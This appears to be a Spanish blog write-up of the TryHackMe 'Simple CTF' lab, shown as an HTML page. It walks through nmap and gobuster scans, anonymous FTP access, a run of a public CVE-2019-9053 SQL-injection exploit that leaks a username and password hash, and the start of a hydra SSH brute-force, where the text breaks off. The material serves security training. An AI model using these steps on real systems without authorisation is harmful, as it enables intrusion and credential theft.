@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Simple CTF - THM  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='CTF, easy, hacking, THM, tryhackme, writeup' />
+    
+    
+        <meta name="description" content="r paso que hay que dar en toda prueba de penetración es el de enumeración. La habitación de TryHackMe nos hace unas primeras preguntas relacionadas con este paso, que son:
+¿Cuantos servicios están funcionando en el puerto 1000? ¿Cual es el servicio del puerto más alto?" />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Simple CTF - THM" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2022-11-08T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="CTF" />
+        
+            <meta property="article:tag" content="easy" />
+        
+            <meta property="article:tag" content="hacking" />
+        
+            <meta property="article:tag" content="THM" />
+        
+            <meta property="article:tag" content="tryhackme" />
+        
+            <meta property="article:tag" content="writeup" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/simple_ctf/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/simple-ctf/simple_ctf_intro.png
+        ' />
+    
+        <meta property="og:description" content="Enumeración El primer paso que hay que dar en toda prueba de penetración es el de enumeración. La habitación de TryHackMe nos hace unas primeras preguntas relac" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/simple_ctf/" />
+
+
+    <meta name="twitter:title" content="Simple CTF - THM" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/simple-ctf/simple_ctf_intro.png
+        ' />
+    
+        <meta name="twitter:description" content="Enumeración El primer paso que hay que dar en toda prueba de penetración es el de enumeración. La habitación de TryHackMe nos hace unas primeras preguntas relac" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:albertoperezdelrio@gmail.com">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3sscode">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Simple CTF - THM</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2022-11-08
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/simple-ctf/simple_ctf_intro.png" alt="" />
+            
+        </figure>
+    
+    
+    <div><h1 id="enumeración">Enumeración</h1>
+<p>El primer paso que hay que dar en toda prueba de penetración es el de enumeración. La habitación de TryHackMe nos hace unas primeras preguntas relacionadas con este paso, que son:</p>
+<ul>
+<li>¿Cuantos servicios están funcionando en el puerto 1000?</li>
+<li>¿Cual es el servicio del puerto más alto?</li>
+</ul>
+<p>Para resolver estas dos preguntas, empezamos con un escaneo de puertos usando <strong>nmap</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -n -Pn -sC -sV -T4 -open 10.10.91.117
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-15 20:54 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.91.117
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.18.112.125
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">2</span> disallowed entries 
+</span></span><span style="display:flex;"><span>|_/ /openemr-5_0_1_3 
+</span></span><span style="display:flex;"><span>2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 294269149ecad917988c27723acda923 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9bd165075108006198de95ed3ae3811c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 12651b61cf4de575fef4e8d46e102af6 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 44.36 seconds
+</span></span></code></pre></div><p>Estas son las opciones que uso en nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-n
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Sin resolución de DNS, más rápido</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-sC 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Es equivalente a --script=default </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-sV*
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Detección de versión</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-T4  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Establecer una plantilla de tiempo</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Si tiene una conexión Ethernet o de banda ancha decente, recomendaría usar siempre -T4</span>
+</span></span></code></pre></div><p>Tras el escaneo, podemos contestar a las dos preguntas que nos hace la sala.</p>
+<h1 id="análisis-de-vulnerabilidades">Análisis de vulnerabilidades</h1>
+<p>En esta fase vamos a analizar las vulnerabilidades que puede tener la máquina. Usando los datos recogidos durante la fase de enumeración, podremos comprobar si hay alguna vulnerabilidad conocida que podamos aprovechar.</p>
+<p>En este caso hay una mala configuración de seguyridad, parece que han dejado la puerta abierta en el servidor FPT para que se conecten usuarios anónimos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>*
+</span></span></code></pre></div><p>Bien, ahora toca revisar la web que tienen en el puerto 80 con el servidor apache. Voy a usar la herramienta <strong>GoBuster</strong> para enumerar las posibles páginas y directorios que tenga la web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://10.10.91.117/ -w /usr/share/wordlists/dirb/common.txt 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.2.0-dev
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.91.117/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.2.0-dev
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/10/15 21:09:57 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 291<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 296<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 296<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11321<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 929<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 300<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/simple               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.91.117/simple/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">4609</span> / <span style="color:#ae81ff">4615</span> <span style="color:#f92672">(</span>99.87%<span style="color:#f92672">)===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/10/15 21:10:16 Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>Además, compruebo si tiene el fichero robots.txt, que parece ser que el listado que usado para enumerar las paginas no tenia ese termino guardado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   This file tells search engines not to index your CUPS server.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   Copyright 1993-2003 by Easy Software Products.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   These coded instructions, statements, and computer programs are the</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   property of Easy Software Products and are protected by Federal</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   copyright law.  Distribution and use rights are outlined in the file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   &#34;LICENSE.txt&#34; which should have been included with this file.  If this</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   file is missing or damaged please contact Easy Software Products</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   at:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       Attn: CUPS Licensing Information</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       Easy Software Products</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       44141 Airport View Drive, Suite 204</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       Hollywood, Maryland 20636-3111 USA</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       Voice: (301) 373-9600</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       EMail: cups-info@cups.org</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#         WWW: http://www.cups.org</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User-agent: *
+</span></span><span style="display:flex;"><span>Disallow: /
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Disallow: /openemr-5_0_1_3 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># End of &#34;$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $&#34;.</span>
+</span></span></code></pre></div><p>Entro en la dirección encontrada y veo que tienen un CMS llamado <strong>CMS Made Simple (version 2.2.8)</strong>. Hago una busqueda rápida para ver que vulnerabilidades puede tener.</p>
+<p><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></p>
+<p><strong>CVE-2019-9053</strong> es una vulnerabilidad de tipo <strong>SQL Injection</strong>. En el script que descargo vienen unas intrucciones:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Example usage <span style="color:#f92672">(</span>with cracking password<span style="color:#f92672">)</span>: exploit.py -u http://target-uri --crack -w /path-wordlist<span style="color:#e6db74">&#34;
+</span></span></span></code></pre></div><p>Aquí acaba la fase de recopilación de información, en principio&hellip;</p>
+<h1 id="explotación">Explotación</h1>
+<p>Vamos a aprovecharnos de la mala configuración del servidor FTP para acceder y husmear un poco, por si hubiese algo de utilidad.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ftp 10.10.91.117
+</span></span><span style="display:flex;"><span>Connected to 10.10.91.117.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#f92672">(</span>10.10.91.117:alberto<span style="color:#f92672">)</span>: anonymous
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system type is UNIX.
+</span></span><span style="display:flex;"><span>Using binary mode to transfer files.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> Entering Extended Passive Mode <span style="color:#f92672">(||</span>|47009|<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp: Can<span style="color:#e6db74">&#39;t connect to `10.10.91.117:47009&#39;</span>: Expiró el tiempo de conexión
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful. Consider using EPSV.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> pub
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; cd pub
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Directory successfully changed.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful. Consider using EPSV.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">166</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> ForMitch.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span>ftp&gt; get ForMitch.txt
+</span></span><span style="display:flex;"><span>local: ForMitch.txt remote: ForMitch.txt
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span> EPRT command successful. Consider using EPSV.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> ForMitch.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">166</span> bytes<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>100% |*****************************************************************************************************************************
+</span></span><span style="display:flex;"><span>********************************************************************|   <span style="color:#ae81ff">166</span>        4.52 MiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">166</span> bytes received in 00:00 <span style="color:#f92672">(</span>4.43 KiB/s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; exit
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span> Goodbye.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat ForMitch.txt 
+</span></span><span style="display:flex;"><span>Dammit man... you<span style="color:#e6db74">&#39;te the worst dev i&#39;</span>ve seen. You set the same pass <span style="color:#66d9ef">for</span> the system user, and the password is so weak... 
+</span></span><span style="display:flex;"><span>i cracked it in seconds. Gosh... what a mess!
+</span></span></code></pre></div><p>Vale ahora tenemos un usuario vulnerable, <strong>mitch</strong>, que tiene una contraseña débil. Necesitamos conseguir la contraseña, para ello hay que usar el script de <strong>CVE-2019-9053</strong>. Lo ejecuto contra la máquina y le paso una wordlist para intentar crackear la contraseña.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ python3 CVE-2019-9053-python3.py -u http://10.10.60.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: 1dac0d92e9fa6bb2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Now try to crack password
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/alberto/Descargas/CVE-2019-9053-python3.py&#34;</span>, line 184, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>    crack_password<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/alberto/Descargas/CVE-2019-9053-python3.py&#34;</span>, line 53, in crack_password
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> line in dict.readlines<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/alberto/.pyenv/versions/3.10.7/lib/python3.10/codecs.py&#34;</span>, line 322, in decode
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>result, consumed<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> self._buffer_decode<span style="color:#f92672">(</span>data, self.errors, final<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>UnicodeDecodeError: <span style="color:#e6db74">&#39;utf-8&#39;</span> codec can<span style="color:#960050;background-color:#1e0010">&#39;</span>t decode byte 0xf1 in position 933: invalid continuation byte
+</span></span></code></pre></div><p>Parece que el script da algun problema al ejecutarlo con Python 3.8, que es el que tengo. Estos son los datos que ha podido obtener de momento:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+</span></span></code></pre></div><p>Para no perder mas tiempo en arreglar el script para que sea compatible, o buscar la manera de ejecutarlo con python2, voy a hacer un ataque de fuerza bruta contra el servicio <strong>ssh</strong> usando el usuario que hemos encontrado, ya que la contraseña parece ser muy sencilla. Para hacerlo, voy a usar la herramienta <strong>hydra</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>alberto㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Descargas<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.60.189:2222     
+</span></span><span style="display:flex;"><span>Hydra v9.3 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2022-10-16 00:03:20
